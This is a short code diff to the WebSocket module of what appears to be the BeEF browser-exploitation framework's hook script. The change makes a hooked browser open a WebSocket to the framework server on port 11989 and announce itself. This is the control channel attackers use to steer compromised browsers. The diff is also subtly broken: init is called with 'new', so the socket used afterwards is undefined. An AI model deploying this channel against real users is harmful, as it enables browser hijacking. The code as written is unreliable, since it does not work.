@@ -19,24 +19,36 @@
 beef.websocket = {
 
     socket: null,
+
+    init: function(){
+        var webSocketServer=beef.net.host;
+        var webSocketPort=11989;
+        if(beef.browser.isFF()){
+            this.socket = new MozWebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
+        }else{
+            this.socket = new WebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
+        }
+    },
     /*websocket send Helo to beef server and start async communication*/
     start:function(){
-        console.log("started ws \n")
+        console.log("started ws \n");
 
-           /*server is always on ws.beefServer:6666*/
-        var webSocketServer=beef.net.host; /*beefHost*/
-        console.log(webSocketServer);
-        var webSocketPort=11989;
-          if(beef.browser.isFF()){
-              this.socket = new MozWebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
-          }else{
-               this.socket = new WebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
-          }
+        new beef.websocket.init();
            /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/
 
-    this.socket.send("Helo"+"myid00");
-    console.log("Connected and Helo");
+        this.socket.onopen = function(){
+            console.log("Socket has been opened!");
+            this.send("Helo"+"myid00");
+            console.log("Connected and Helo");
+        }
+
+    },
+
+    send:function(data){
+       this.socket.send(data);
+       console.log("Sent [" + data + "]");
     }
 
+};
 
-}   /*end websocket*/
+beef.regCmp('beef.websocket');
